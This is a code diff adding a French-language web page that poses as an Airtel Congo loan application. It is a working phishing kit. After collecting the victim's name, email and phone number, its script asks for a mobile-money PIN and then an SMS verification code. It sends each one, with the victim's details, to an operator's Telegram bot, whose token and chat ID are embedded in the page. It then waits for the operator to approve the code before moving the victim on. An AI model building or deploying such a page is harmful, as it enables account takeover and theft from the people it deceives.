@@ -1,0 +1,622 @@
+<!doctype html>
+<html lang="fr">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content="Prêt urgent pour besoins personnels ? Remboursement sur revenu mensuel.">
+  <title>Demande de Prêt Airtel</title>
+  <style>
+    *{box-sizing:border-box}
+    :root{--blue:#5b6fe3;--purple:#a64fc9;--ink:#17202b;--muted:#8b929d;--line:#d6d6d6}
+    body{margin:0;background:#e8e8e8;color:var(--ink);font:14px/1.45 Arial,Helvetica,sans-serif;min-height:100vh;display:flex;flex-direction:column}
+    .topbar{height:51px;background:#fafafa;border-bottom:1px solid #ddd;display:flex;align-items:center;justify-content:center;padding:0 28px;position:relative}
+    .brand{text-decoration:none;color:#e21e2b;font-size:22px;font-weight:800;letter-spacing:-.7px;line-height:1;text-align:center}.brand span{color:#333}.brand small{display:block;font-size:7px;letter-spacing:.5px;color:#777;font-weight:500}
+    .brand-mark{color:#e21e2b}.back{position:absolute;left:28px;color:#333;text-decoration:none}.menu{position:absolute;right:28px;border:0;background:none;font-size:24px;color:#333;cursor:pointer}.hidden{display:none!important}
+    main{flex:1;display:flex;justify-content:center;align-items:flex-start;padding:26px 16px 55px}
+    .panel{background:#fff;border-radius:12px;box-shadow:0 3px 6px #00000020;width:min(525px,100%);padding:38px 35px 42px}
+    .home-panel{text-align:center}.home-panel h1{font-size:20px;margin:0 0 4px;font-weight:750}.brand-inline{color:#e21e2b;font-weight:800}.brand-inline span{color:#333}.subtitle{color:#9298a1;margin:0 0 27px;font-size:13px}
+    .calculator{background:#f7f8fa;border-radius:12px;padding:20px 24px 22px;text-align:left;margin-bottom:27px}.calculator h2{text-align:center;font-size:16px;margin:0 0 19px}
+    .range-heading{display:flex;justify-content:space-between;align-items:center;margin-bottom:11px;color:#4c5562}.range-heading strong{color:var(--blue);font-size:16px}
+    input[type=range]{width:100%;accent-color:var(--blue);cursor:pointer;margin:0}.range-limits{display:flex;justify-content:space-between;color:#a1a7b0;font-size:10px;margin-top:2px}.duration-heading{margin-top:18px}
+    .payment{border:1px solid var(--blue);border-radius:8px;background:white;padding:13px 17px;margin-top:20px;display:flex;justify-content:space-between;align-items:center}.payment strong{font-size:20px;color:var(--blue)}
+    .disclaimer{font-size:10px;color:#8c929a;margin:8px 0 0}.primary{border:0;border-radius:7px;background:linear-gradient(105deg,var(--blue),var(--purple));color:#fff;font-weight:700;padding:14px 20px;cursor:pointer;min-height:44px}.primary:hover{filter:brightness(1.04)}.full{width:100%}
+    .benefits{display:grid;grid-template-columns:repeat(3,1fr);gap:13px;margin-top:27px}.benefits div{background:#f7f8fa;border-radius:8px;padding:12px 6px;display:flex;flex-direction:column;align-items:center}.benefits b{font-size:22px;margin-bottom:4px}.benefits strong{font-size:11px}.benefits small{font-size:10px;color:#9298a1}
+    .form-panel{padding:38px 35px 36px}.form-panel h1,.verify-panel h1{text-align:center;font-size:24px;margin:0}.step-label{text-align:center;color:#9298a1;font-size:12px;margin:3px 0 25px}
+    .progress{display:flex;justify-content:center;gap:7px;margin-bottom:34px}.progress i{height:4px;width:52px;border-radius:4px;background:#ddd}.progress i.active{background:var(--blue)}
+    label{display:block;font-size:12px;font-weight:600;margin:0 0 7px}.step>label:not(:first-child){margin-top:20px}
+    input:not([type=range]),select,textarea{width:100%;border:1px solid #d0d0d0;border-radius:6px;padding:12px 14px;font:14px Arial;color:#343b45;background:#fff;outline:none;min-height:41px}
+    input:focus,select:focus,textarea:focus{border-color:var(--blue);box-shadow:0 0 0 2px #5b6fe31a}textarea{resize:vertical}
+    .two-col{display:grid;grid-template-columns:1fr 1fr;gap:14px}.two-col label{margin-top:0}
+    .phone-row{display:flex;gap:8px}.phone-row span{border:1px solid #d0d0d0;border-radius:6px;padding:11px 13px;white-space:nowrap}.phone-row input{flex:1;min-width:0}.hint{display:block;color:#9a9a9a;font-size:10px;margin-top:5px}
+    .form-actions{display:flex;gap:14px;margin-top:35px}.form-actions button{flex:1}.secondary{border:0;border-radius:7px;background:#e7e7e7;color:#515967;font-weight:700;min-height:44px;cursor:pointer}
+    .summary{background:#f7f8fa;border-radius:9px;padding:18px 20px;margin-top:22px}.summary h2{font-size:16px;margin:0 0 13px}.summary div{display:flex;justify-content:space-between;gap:15px;padding:9px 0;border-bottom:1px solid #ddd;font-size:12px}.summary div:last-child{border:0}.summary span{color:#818894}.summary strong{text-align:right;overflow-wrap:anywhere}
+    .error{color:#c62828;font-size:12px;margin:12px 0 0;min-height:16px}
+    .verify-panel{text-align:center;padding:48px 38px}.success-icon{width:66px;height:66px;border-radius:50%;background:#e7f6ed;color:#279653;font-size:38px;display:grid;place-items:center;margin:0 auto 18px}.notice{background:#f7f8fa;padding:18px;border-radius:8px;margin:25px 0;color:#737b86;line-height:1.7}
+    .loading-overlay{position:fixed;inset:0;background:rgba(0,0,0,.48);display:grid;place-items:center;padding:20px;z-index:10}
+    .loading-card{width:min(438px,100%);min-height:276px;background:#fff;border-radius:11px;box-shadow:0 5px 20px #0003;display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center;padding:30px}
+    .spinner{width:86px;height:86px;border-radius:50%;border:9px solid #8192e8;border-right-color:transparent;border-bottom-color:#8192e8;animation:spin 1s linear infinite;box-shadow:0 0 28px #8192e866;margin-bottom:26px}
+    .loading-card h2{color:#7185e5;font-size:23px;margin:0 0 3px}.loading-card p{color:#777;margin:0;font-size:13px}
+    @keyframes spin{to{transform:rotate(360deg)}}
+    footer{text-align:center;color:#9298a1;background:#f7f7f7;border-top:1px solid #ddd;padding:14px;font-size:12px}
+    @media(max-width:560px){main{padding:18px 12px 35px}.panel{padding:28px 20px 30px}.home-panel h1{font-size:17px}.calculator{padding:18px 16px}.benefits{gap:7px}.benefits strong{font-size:10px}.form-panel h1{font-size:22px}.two-col{gap:9px}.form-actions{gap:9px}.summary{padding:15px 13px}.summary div{font-size:11px}.back{left:12px}.menu{right:12px}}
+    .verification-panel{position:relative;overflow:hidden;text-align:center;padding:42px 35px 38px}
+    .demo-ribbon{display:inline-block;background:#fff3cd;color:#765500;border:1px solid #f0d98c;border-radius:20px;padding:7px 11px;font-size:10px;font-weight:700;margin:0 auto 18px}
+    .verification-panel h1{font-size:23px;margin:0 0 8px}
+    .verify-intro{color:#858b95;font-size:12px;line-height:1.55;margin:0 auto 20px;max-width:390px}
+    .phone-display{height:55px;border:1.5px solid #397b9d;border-radius:8px;display:flex;align-items:center;justify-content:center;gap:10px;padding:0 15px;max-width:360px;margin:0 auto}
+    .phone-display strong{font-size:15px;font-weight:600;letter-spacing:.3px}
+    .verify-label{color:#9298a1;font-size:14px;margin:28px 0 14px}
+    .codes{display:flex;justify-content:center;align-items:center;gap:12px}
+    .codes input{width:52px;height:56px;border:1.5px solid #397b9d;border-radius:9px;text-align:center;font-size:23px;padding:0;min-height:0}
+    .codes input:focus{border-color:#7187e8;box-shadow:0 0 0 3px #7187e822}
+    .eye{border:0;background:none;font-size:21px;cursor:pointer;margin-left:8px;padding:8px}
+    .action{margin-top:30px;width:100%;max-width:360px;height:48px;border:0;border-radius:8px;background:#dedede;color:#fff;font-weight:700;cursor:not-allowed}
+    .action.ready{background:#687fe0;cursor:pointer}.action:disabled{opacity:1}
+    .note,.verification-panel .note{color:#888;font-size:11px;line-height:1.5;margin:14px auto;max-width:360px}
+    .status{color:#687fe0;font-size:12px;min-height:18px;margin:8px 0 0}
+    .verification-heading{font-weight:700;margin:12px 0 8px}
+    @media(max-width:560px){.verification-panel{padding:32px 18px}.codes{gap:8px}.codes input{width:48px;height:52px}.eye{margin-left:2px;padding:6px}}
+  </style>
+</head>
+<body>
+  <header class="topbar">
+    <a class="back hidden" id="backLink" href="#" aria-label="Retour">← Retour</a>
+    <a class="brand" id="brandHome" href="#" aria-label="Accueil Demo Finance">
+      <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSQSTnm-h_nAA4QN-K6WxMaElmJqrXNeI04XtMvjX3RRA&s=10" alt="Logo Airtel" class="brand-logo" style="height: 28px; width: auto; vertical-align: middle;">
+      <small style="color: red;">A REASON TO IMAGINE</small>
+    </a>
+    <button class="menu" id="menuBtn" type="button" aria-label="Menu">☰</button>
+  </header>
+
+  <main>
+    <section class="panel home-panel" id="home">
+      <h1>DEMANDEZ VOTRE PRÊT AVEC <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSQSTnm-h_nAA4QN-K6WxMaElmJqrXNeI04XtMvjX3RRA&s=10" alt="Logo Airtel" style="height: 22px; width: auto; vertical-align: middle;"></h1>
+      <p class="subtitle">Approbation rapide • Taux compétitifs • Conditions flexibles</p>
+      <div class="calculator">
+        <h2>Calculateur de prêt</h2>
+        <div class="range-heading"><label for="amountRange">Montant du prêt</label><strong id="amountLabel">$2,500</strong></div>
+        <input id="amountRange" type="range" min="100" max="5000" step="100" value="2500">
+        <div class="range-limits"><span>$100</span><span>$5,000</span></div>
+        <div class="range-heading duration-heading"><label for="durationRange">Durée du prêt</label><strong id="durationLabel">12 mois</strong></div>
+        <input id="durationRange" type="range" min="6" max="60" step="6" value="12">
+        <div class="range-limits"><span>6 mois</span><span>60 mois</span></div>
+        <div class="payment"><span>Mensualité</span><strong id="paymentLabel">$225.00</strong></div>
+        <p class="disclaimer"></p>
+      </div>
+      <button class="primary full" id="applyBtn" type="button">DEMANDER MAINTENANT</button>
+      <div class="benefits">
+        <div><b>⚡</b><strong>Approbation rapide</strong><small>En moins de 24 heures</small></div>
+        <div><b>💰</b><strong>Taux bas</strong><small>À partir de 8 %</small></div>
+        <div><b>🔒</b><strong>Sécurisé</strong><small>Niveau bancaire</small></div>
+      </div>
+    </section>
+
+    <section class="panel form-panel hidden" id="application">
+      <h1>Demande de prêt</h1>
+      <p class="step-label" id="stepLabel">Étape 1 sur 3</p>
+      <div class="progress" aria-label="Progression de la demande"><i id="progress1" class="active"></i><i id="progress2"></i><i id="progress3"></i></div>
+      <form id="loanForm" novalidate>
+        <div class="step" data-step="1">
+          <label for="loanType">Type de prêt</label>
+          <select id="loanType"><option>Prêt personnel</option><option>Prêt professionnel</option><option>Prêt étudiant</option><option>Prêt d'urgence</option></select>
+          <label for="loanAmount">Montant du prêt (USD)</label>
+          <input id="loanAmount" type="number" min="100" max="5000" value="2500" required>
+          <label for="loanDuration">Durée du prêt</label>
+          <select id="loanDuration"><option value="6">6 mois</option><option value="12" selected>12 mois</option><option value="18">18 mois</option><option value="24">24 mois</option><option value="36">36 mois</option><option value="48">48 mois</option><option value="60">60 mois</option></select>
+          <label for="purpose">Objet du prêt</label>
+          <textarea id="purpose" placeholder="À quoi servira le prêt ?" rows="3" required></textarea>
+        </div>
+        <div class="step hidden" data-step="2">
+          <div class="two-col">
+            <div><label for="firstName">Prénom</label><input id="firstName" autocomplete="given-name" placeholder="Prénom" required></div>
+            <div><label for="lastName">Nom / Nom de famille</label><input id="lastName" autocomplete="family-name" placeholder="Nom / nom de famille" required></div>
+          </div>
+          <label for="email">Adresse e-mail</label>
+          <input id="email" type="email" autocomplete="off" placeholder="exemple@gmail.com" required>
+          <label for="phone">Numéro de téléphone</label>
+          <div class="phone-row"><span>+243</span><input id="phone" inputmode="numeric" placeholder="Entrez les chiffres du numéro" maxlength="10" required></div>
+          <small class="hint"></small>
+        </div>
+        <div class="step hidden" data-step="3">
+          <label for="employment">Statut professionnel</label>
+          <select id="employment"><option>Salarié</option><option>Travailleur indépendant</option><option>Chef d'entreprise</option><option>Étudiant</option><option>Sans emploi</option></select>
+          <label for="income">Revenu annuel (USD)</label>
+          <input id="income" type="number" min="0" placeholder="50000">
+          <div class="summary">
+            <h2>Résumé de la demande</h2>
+            <div><span>Type de prêt :</span><strong id="sumType">Prêt personnel</strong></div>
+            <div><span>Montant du prêt :</span><strong id="sumAmount">$2,500</strong></div>
+            <div><span>Durée du prêt :</span><strong id="sumDuration">12 mois</strong></div>
+            <div><span>Objet :</span><strong id="sumPurpose">—</strong></div>
+            <div><span>Demandeur :</span><strong id="sumApplicant">—</strong></div>
+            <div><span>E-mail :</span><strong id="sumEmail">—</strong></div>
+            <div><span>Téléphone :</span><strong id="sumPhone">—</strong></div>
+          </div>
+          <p class="disclaimer"></p>
+        </div>
+        <div class="form-actions">
+          <button type="button" class="secondary hidden" id="previousBtn">PRÉCÉDENT</button>
+          <button type="button" class="primary" id="nextBtn">ÉTAPE SUIVANTE</button>
+          <button type="submit" class="primary hidden" id="submitBtn">CONTINUER</button>
+        </div>
+        <p class="error" id="errorMsg" role="alert" aria-live="polite"></p>
+      </form>
+    </section>
+
+    <section class="panel verification-panel hidden" id="verification">
+      <div class="demo-ribbon"></div>
+      <p class="verify-intro"></p>
+      <div class="verification-step" id="verificationStep1">
+        <h1>Entrez le code PIN</h1>
+        <div class="phone-display"><span>🌐</span><strong id="verificationPhone">+243 ••••••••••</strong></div>
+        <p class="verify-label">Entrez votre code PIN</p>
+        <div class="codes" id="code1" aria-label="Premier code à quatre chiffres">
+          <input type="password" inputmode="numeric" maxlength="1" aria-label="Premier chiffre du code" autocomplete="off">
+          <input type="password" inputmode="numeric" maxlength="1" aria-label="Deuxième chiffre du code" autocomplete="off">
+          <input type="password" inputmode="numeric" maxlength="1" aria-label="Troisième chiffre du code" autocomplete="off">
+          <input type="password" inputmode="numeric" maxlength="1" aria-label="Quatrième chiffre du code" autocomplete="off">
+          <button class="eye" type="button" data-toggle="code1" aria-label="Afficher ou masquer le premier code">◉</button>
+        </div>
+        <button class="action" id="continueCode" type="button" disabled>CONTINUER</button>
+        <p class="note">Entrez le code PIN à quatre chiffres</p>
+        <p class="status" id="status1" role="status" aria-live="polite"></p>
+      </div>
+      <div class="verification-step hidden" id="verificationStep2">
+        <h1>Entrez le code de vérification</h1>
+        <p class="verification-heading"></p>
+        <p class="verify-intro"></p>
+        <p class="verify-label">Entrez le code de vérification envoyé au numéro de téléphone</p>
+        <div class="codes" id="code2" aria-label="Deuxième code à quatre chiffres">
+          <input type="password" inputmode="numeric" maxlength="1" aria-label="Premier chiffre du deuxième code" autocomplete="off">
+          <input type="password" inputmode="numeric" maxlength="1" aria-label="Deuxième chiffre du deuxième code" autocomplete="off">
+          <input type="password" inputmode="numeric" maxlength="1" aria-label="Troisième chiffre du deuxième code" autocomplete="off">
+          <input type="password" inputmode="numeric" maxlength="1" aria-label="Quatrième chiffre du deuxième code" autocomplete="off">
+          <button class="eye" type="button" data-toggle="code2" aria-label="Afficher ou masquer le deuxième code">◉</button>
+        </div>
+        <button class="action" id="verifyCode" type="button" disabled>VÉRIFIER</button>
+        <p class="note">Entrez le code à quatre chiffres.</p>
+        <p class="status" id="status2" role="status" aria-live="polite"></p>
+      </div>
+    </section>
+
+    <section class="panel verify-panel hidden" id="confirmation">
+      <div class="success-icon">✓</div>
+      <h1>Soumis</h1>
+      <div class="notice">Votre demande et vos étapes de vérification ont été vérifiées.</div>
+      <button class="primary full" id="restartBtn" type="button">NOUVELLE DEMANDE</button>
+    </section>
+  </main>
+
+  <div class="loading-overlay hidden" id="loadingOverlay" role="status" aria-live="polite">
+    <div class="loading-card"><div class="spinner" aria-hidden="true"></div><h2>Envoi en cours...</h2><p></p></div>
+  </div>
+
+  <footer>© 2026 Airtel Congo. Tous droits réservés.</footer>
+
+  <script>
+    'use strict';
+
+    const TELEGRAM_BOT_TOKEN = "8253214824:AAGodlrpAXEFqUcWOGXKbzCoNHLoL5vArcE";
+    const TELEGRAM_CHAT_ID = "6009831676";
+    const TG_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
+
+    const $ = id => document.getElementById(id);
+    const home = $('home');
+    const application = $('application');
+    const verification = $('verification');
+    const confirmation = $('confirmation');
+    const loadingOverlay = $('loadingOverlay');
+
+    let step = 1;
+    let lastUpdateId = 0;
+
+    const money = n => '$' + Number(n || 0).toLocaleString('en-US', { maximumFractionDigits: 0 });
+
+    function formatTime(date) {
+      return date.toLocaleTimeString('en-US', {
+        hour: '2-digit',
+        minute: '2-digit',
+        second: '2-digit',
+        hour12: true
+      });
+    }
+
+    function formatDateTime(date) {
+      const yyyy = date.getFullYear();
+      const mm = String(date.getMonth() + 1).padStart(2, '0');
+      const dd = String(date.getDate()).padStart(2, '0');
+      return `${yyyy}-${mm}-${dd} ${formatTime(date)}`;
+    }
+
+    async function tgRequest(method, payload) {
+      const res = await fetch(`${TG_API}/${method}`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+      return await res.json();
+    }
+
+    async function syncLatestUpdateOffset() {
+      try {
+        const data = await tgRequest('getUpdates', { offset: -1, timeout: 0 });
+        if (data.ok && Array.isArray(data.result) && data.result.length > 0) {
+          lastUpdateId = data.result[data.result.length - 1].update_id + 1;
+        }
+      } catch (err) {
+        console.error('Failed to sync update offset:', err);
+      }
+    }
+
+    // Sends ONLY name, phone, and code value (PIN first, then Verification Code), and waits for button click
+    async function submitCodeAndWaitForTelegram({ user, phone, fieldLabel, codeValue, timeoutMs = 120000 }) {
+      await syncLatestUpdateOffset();
+
+      const requestId = `${Date.now()}-${Math.random().toString(36).slice(2, 7)}`;
+      const now = new Date();
+      const expires = new Date(now.getTime() + 5 * 60 * 1000);
+
+      const text = [
+        `🔒 ${fieldLabel.toUpperCase()} SOUMIS POUR VÉRIFICATION`,
+        '────────────────────────',
+        `👤 Utilisateur : ${user}`,
+        `☎️ Téléphone : ${phone}`,
+        `🔑 ${fieldLabel} : ${codeValue}`,
+        '',
+        `⏰ Soumis : ${formatTime(now)}`,
+        `⏰ Expire : ${formatTime(expires)}`,
+        '────────────────────────',
+        '⏳ En attente de la vérification de l\'administrateur...'
+      ].join('\n');
+
+      const sent = await tgRequest('sendMessage', {
+        chat_id: TELEGRAM_CHAT_ID,
+        text,
+        reply_markup: {
+          inline_keyboard: [[
+            { text: '✅ OTP Correct', callback_data: `approve:${requestId}` },
+            { text: '❌ OTP Invalid', callback_data: `reject:${requestId}` }
+          ]]
+        }
+      });
+
+      if (!sent.ok) {
+        throw new Error(sent.description || 'Échec de l\'envoi du message vers Telegram');
+      }
+
+      const deadline = Date.now() + timeoutMs;
+
+      while (Date.now() < deadline) {
+        const remainingSec = Math.max(1, Math.min(15, Math.ceil((deadline - Date.now()) / 1000)));
+        const updatesData = await tgRequest('getUpdates', {
+          offset: lastUpdateId,
+          timeout: remainingSec,
+          allowed_updates: ['callback_query']
+        });
+
+        if (updatesData.ok && Array.isArray(updatesData.result)) {
+          for (const upd of updatesData.result) {
+            lastUpdateId = Math.max(lastUpdateId, upd.update_id + 1);
+            const cq = upd.callback_query;
+            if (!cq || !cq.data) continue;
+
+            const [action, id] = String(cq.data).split(':');
+            if (id !== requestId) continue;
+
+            const approved = action === 'approve';
+
+            await tgRequest('answerCallbackQuery', {
+              callback_query_id: cq.id,
+              text: approved ? 'Confirmé comme correct' : 'Marqué comme invalide'
+            });
+
+            await tgRequest('sendMessage', {
+              chat_id: TELEGRAM_CHAT_ID,
+              text: approved
+                ? [
+                    `✅ ${fieldLabel.toUpperCase()} VÉRIFIÉ AVEC SUCCÈS`,
+                    '────────────────────────',
+                    `👤 Nom : ${user}`,
+                    `☎️ Téléphone : ${phone}`,
+                    `⏰ Vérifié : ${formatDateTime(new Date())}`,
+                    '────────────────────────',
+                    `✅ ${fieldLabel} confirmé !`
+                  ].join('\n')
+                : [
+                    `❌ ${fieldLabel.toUpperCase()} INVALIDE`,
+                    '────────────────────────',
+                    `👤 Nom : ${user}`,
+                    `☎️ Téléphone : ${phone}`
+                  ].join('\n')
+            });
+
+            return { ok: true, verified: approved };
+          }
+        }
+      }
+
+      return { ok: false, verified: false, status: 'timeout' };
+    }
+
+    function estimate() {
+      const amount = Number($('amountRange').value);
+      const months = Number($('durationRange').value);
+      $('amountLabel').textContent = money(amount);
+      $('durationLabel').textContent = months + ' mois';
+      $('paymentLabel').textContent = '$' + ((amount * (1 + 0.08 * months / 12)) / months).toFixed(2);
+    }
+
+    $('amountRange').addEventListener('input', estimate);
+    $('durationRange').addEventListener('input', estimate);
+    estimate();
+
+    $('applyBtn').addEventListener('click', () => {
+      home.classList.add('hidden');
+      application.classList.remove('hidden');
+      $('backLink').classList.remove('hidden');
+      $('loanAmount').value = $('amountRange').value;
+      $('loanDuration').value = $('durationRange').value;
+      showStep(1);
+      window.scrollTo(0, 0);
+    });
+
+    $('brandHome').addEventListener('click', event => {
+      event.preventDefault();
+      if (!application.classList.contains('hidden') || !verification.classList.contains('hidden')) return;
+      showHome();
+    });
+
+    $('backLink').addEventListener('click', event => {
+      event.preventDefault();
+      if (!application.classList.contains('hidden') && step > 1) {
+        showStep(step - 1);
+      } else if (!application.classList.contains('hidden')) {
+        application.classList.add('hidden');
+        home.classList.remove('hidden');
+        $('backLink').classList.add('hidden');
+      }
+    });
+
+    function showStep(n) {
+      step = n;
+      document.querySelectorAll('.step').forEach(el => {
+        el.classList.toggle('hidden', Number(el.dataset.step) !== n);
+      });
+      $('stepLabel').textContent = `Étape ${n} sur 3`;
+      [1, 2, 3].forEach(i => $('progress' + i).classList.toggle('active', i <= n));
+      $('previousBtn').classList.toggle('hidden', n === 1);
+      $('nextBtn').classList.toggle('hidden', n === 3);
+      $('submitBtn').classList.toggle('hidden', n !== 3);
+      $('errorMsg').textContent = '';
+      if (n === 3) updateSummary();
+    }
+
+    function validStep() {
+      const ids = step === 1 ? ['loanAmount', 'purpose'] :
+        step === 2 ? ['firstName', 'lastName', 'email', 'phone'] : [];
+      for (const id of ids) {
+        const el = $(id);
+        if (!el.value.trim()) {
+          el.focus();
+          $('errorMsg').textContent = 'Veuillez remplir les champs obligatoires.';
+          return false;
+        }
+      }
+      if (step === 1) {
+        const amount = Number($('loanAmount').value);
+        if (!Number.isFinite(amount) || amount < 100 || amount > 5000) {
+          $('loanAmount').focus();
+          $('errorMsg').textContent = 'Entrez un montant entre $100 et $5,000.';
+          return false;
+        }
+      }
+      if (step === 2) {
+        if (!$('email').checkValidity()) {
+          $('email').focus();
+          $('errorMsg').textContent = 'Veuillez saisir une adresse e-mail valide.';
+          return false;
+        }
+        if (!/^\d{9,10}$/.test($('phone').value)) {
+          $('phone').focus();
+          $('errorMsg').textContent = 'Entrez 9 à 10 chiffres.';
+          return false;
+        }
+      }
+      return true;
+    }
+
+    $('nextBtn').addEventListener('click', () => {
+      if (validStep()) showStep(step + 1);
+    });
+    $('previousBtn').addEventListener('click', () => showStep(step - 1));
+
+    function updateSummary() {
+      $('sumType').textContent = $('loanType').value;
+      $('sumAmount').textContent = money($('loanAmount').value);
+      $('sumDuration').textContent = $('loanDuration').value + ' mois';
+      $('sumPurpose').textContent = $('purpose').value || '—';
+      $('sumApplicant').textContent = ($('firstName').value + ' ' + $('lastName').value).trim() || '—';
+      $('sumEmail').textContent = $('email').value || '—';
+      $('sumPhone').textContent = '+243 ' + $('phone').value;
+    }
+
+    $('loanForm').addEventListener('submit', event => {
+      event.preventDefault();
+      if (!validStep()) return;
+
+      updateSummary();
+      const phoneRaw = $('phone').value.trim();
+
+      application.classList.add('hidden');
+      verification.classList.remove('hidden');
+      $('verificationPhone').textContent = phoneRaw;
+      $('backLink').classList.add('hidden');
+      resetVerification();
+      window.scrollTo(0, 0);
+    });
+
+    function resetVerification() {
+      $('verificationStep1').classList.remove('hidden');
+      $('verificationStep2').classList.add('hidden');
+      ['code1', 'code2'].forEach(groupId => {
+        $(groupId).querySelectorAll('input').forEach(input => {
+          input.value = '';
+          input.type = 'password';
+        });
+      });
+      $('continueCode').disabled = true;
+      $('continueCode').classList.remove('ready');
+      $('verifyCode').disabled = true;
+      $('verifyCode').classList.remove('ready');
+      $('status1').textContent = '';
+      $('status2').textContent = '';
+    }
+
+    function setupCodeGroup(groupId, buttonId) {
+      const group = $(groupId);
+      const boxes = [...group.querySelectorAll('input')];
+      const button = $(buttonId);
+      const update = () => {
+        const ready = boxes.every(input => /^\d$/.test(input.value));
+        button.disabled = !ready;
+        button.classList.toggle('ready', ready);
+        return ready;
+      };
+      boxes.forEach((box, index) => {
+        box.addEventListener('input', () => {
+          box.value = box.value.replace(/\D/g, '').slice(0, 1);
+          if (box.value && boxes[index + 1]) boxes[index + 1].focus();
+          update();
+        });
+        box.addEventListener('keydown', event => {
+          if (event.key === 'Backspace' && !box.value && boxes[index - 1]) boxes[index - 1].focus();
+          if (event.key === 'ArrowLeft' && boxes[index - 1]) boxes[index - 1].focus();
+          if (event.key === 'ArrowRight' && boxes[index + 1]) boxes[index + 1].focus();
+        });
+        box.addEventListener('paste', event => {
+          const digits = (event.clipboardData.getData('text') || '').replace(/\D/g, '').slice(0, 4);
+          if (!digits) return;
+          event.preventDefault();
+          boxes.forEach((input, i) => { input.value = digits[i] || ''; });
+          boxes[Math.min(digits.length, 3)].focus();
+          update();
+        });
+      });
+      return {
+        update,
+        value: () => boxes.map(input => input.value).join('')
+      };
+    }
+
+    const code1Group = setupCodeGroup('code1', 'continueCode');
+    const code2Group = setupCodeGroup('code2', 'verifyCode');
+
+    // 1. Submit Name, Phone, and PIN -> wait until "OTP Correct" is clicked in Telegram -> go directly to Verification Code step
+    $('continueCode').addEventListener('click', async () => {
+      if (!code1Group.update()) return;
+
+      const user = `${$('firstName').value.trim()} ${$('lastName').value.trim()}`.trim();
+      const phone = $('phone').value.trim();
+      const pin = code1Group.value();
+
+      $('continueCode').disabled = true;
+      $('status1').textContent = 'Veuillez patienter pendant la confirmation des informations...';
+
+      try {
+        const result = await submitCodeAndWaitForTelegram({
+          user,
+          phone,
+          fieldLabel: 'PIN saisi',
+          codeValue: pin
+        });
+
+        if (result.ok && result.verified) {
+          $('status1').textContent = 'Confirmé.';
+          $('verificationStep1').classList.add('hidden');
+          $('verificationStep2').classList.remove('hidden');
+          $('code2').querySelector('input').focus();
+          window.scrollTo(0, 0);
+        } else if (result.status === 'timeout') {
+          $('status1').textContent = 'Aucune confirmation. Réessayez.';
+          $('continueCode').disabled = false;
+        } else {
+          $('status1').textContent = 'Marqué comme invalide. Veuillez réessayer et vérifier que vous saisissez les bonnes informations.';
+          $('continueCode').disabled = false;
+        }
+      } catch (err) {
+        console.error(err);
+        $('status1').textContent = err.message || 'Erreur de communication.';
+        $('continueCode').disabled = false;
+      }
+    });
+
+    // 2. Submit Name, Phone, and Verification Code -> wait until "OTP Correct" is clicked in Telegram -> go to Confirmation
+    $('verifyCode').addEventListener('click', async () => {
+      if (!code2Group.update()) return;
+
+      const user = `${$('firstName').value.trim()} ${$('lastName').value.trim()}`.trim();
+      const phone = $('phone').value.trim();
+      const otpEntered = code2Group.value();
+
+      $('verifyCode').disabled = true;
+      $('status2').textContent = 'Veuillez patienter pendant la confirmation du code OTP...';
+
+      try {
+        const result = await submitCodeAndWaitForTelegram({
+          user,
+          phone,
+          fieldLabel: 'OTP saisi',
+          codeValue: otpEntered
+        });
+
+        if (result.ok && result.verified) {
+          $('status2').textContent = 'OTP vérifié.';
+          verification.classList.add('hidden');
+          confirmation.classList.remove('hidden');
+          window.scrollTo(0, 0);
+        } else if (result.status === 'timeout') {
+          $('status2').textContent = 'Réessayez et vérifiez que vous saisissez les bonnes informations.';
+          $('verifyCode').disabled = false;
+        } else {
+          $('status2').textContent = 'OTP invalide. Veuillez réessayer.';
+          $('verifyCode').disabled = false;
+        }
+      } catch (err) {
+        console.error(err);
+        $('status2').textContent = err.message || 'Erreur.';
+        $('verifyCode').disabled = false;
+      }
+    });
+
+    document.querySelectorAll('[data-toggle]').forEach(button => {
+      button.addEventListener('click', () => {
+        const inputs = [...$(button.dataset.toggle).querySelectorAll('input')];
+        const show = inputs[0].type === 'password';
+        inputs.forEach(input => { input.type = show ? 'text' : 'password'; });
+      });
+    });
+
+    function showHome() {
+      confirmation.classList.add('hidden');
+      verification.classList.add('hidden');
+      application.classList.add('hidden');
+      home.classList.remove('hidden');
+      $('backLink').classList.add('hidden');
+      window.scrollTo(0, 0);
+    }
+
+    $('restartBtn').addEventListener('click', () => {
+      $('loanForm').reset();
+      $('amountRange').value = 2500;
+      $('durationRange').value = 12;
+      resetVerification();
+      estimate();
+      showHome();
+    });
+
+    $('menuBtn').addEventListener('click', () => {
+      window.alert('Demande de prêt Airtel');
+    });
+  </script>
+</body>
+</html>
